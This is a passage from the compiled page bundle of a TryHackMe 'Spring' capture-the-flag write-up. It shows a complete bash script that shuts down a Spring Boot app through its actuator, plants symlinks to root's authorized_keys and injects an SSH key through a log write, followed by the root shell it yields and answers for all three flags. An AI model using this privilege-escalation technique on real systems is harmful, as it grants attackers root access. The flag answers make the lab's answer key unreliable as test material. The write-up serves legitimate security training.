johnsmith johnsmith     30 Oct 20 11:21 1603192880.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192881.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192882.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192883.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192884.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192885.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192886.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192887.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192888.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192889.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192890.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192891.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192892.log -> /tmp/arbitrary_file_write.test\nlrwxrwxrwx 1 johnsmith johnsmith     30 Oct 20 11:21 1603192893.log -> /tmp/arbitrary_file_write.test\n-rw-rw-r-- 1 johnsmith johnsmith    376 Oct 20 11:20 arbitrary_file_write.sh\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\n#generate ssh key if it does not exists\n[ -f ./key ] && true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""\n#read public key\npubkey=$(cat ./key.pub)\n\n#send a shutdown request to the spring boot server\ncurl -X POST https://localhost/actuator/shutdown -H \'x-9ad42dea0356cb04: 172.16.0.21\' -k\n\n#get date as epoch format\nd=$(date \'+%s\')\n\n#let\'s assume 30 seconds is enough to restart the service\nfor i in {1..30}\ndo\n #create symlinks to /root/.ssh/authorized_keys for 30 seconds\n let time=$(( d + i ))\n ln -s /root/.ssh/authorized_keys "$time.log"\ndone\n\n#wait for app to restart\nsleep 30s\n\n#send publickey as name to the greating server\ncurl --data-urlencode "name=$pubkey" https://localhost/ -k\nsleep 5s\n\n#connect as root\nssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'johnsmith@spring:~/tomcatlogs$ nano get_root.sh\njohnsmith@spring:~/tomcatlogs$ bash get_root.sh\n{"message":"Shutting down, bye..."}\nwhoami\nHello, ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILKTKMqNsInLM2tkn0LUwUH1ejRM1tm39w7FT9joN17E johnsmith@spring!Warning: Permanently added \'localhost\' (ECDSA) to the list of known hosts.\n\nwhoami\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue Oct 20 11:24:59 UTC 2020\n\n  System load:  0.62               Processes:           101\n  Usage of /:   11.7% of 58.80GB   Users logged in:     1\n  Memory usage: 35%                IP address for eth0: 10.10.6.25\n  Swap usage:   0%\n\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n9 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nroot@spring:~# ls\nroot.txt  start_tomcat.sh\nroot@spring:~# cat root.txt\nTHM{sshd_does_not_mind_the_junk}\nroot@spring:~#\n')),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What's the flag in foothold.txt?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{dont_expose_.git_to_internet}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What's the flag in user.txt?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{this_is_still_password_reuse}")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What's the flag in root.txt?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{sshd_does_not_mind_the_junk}")))}g.isMDXComponent=!0}}]);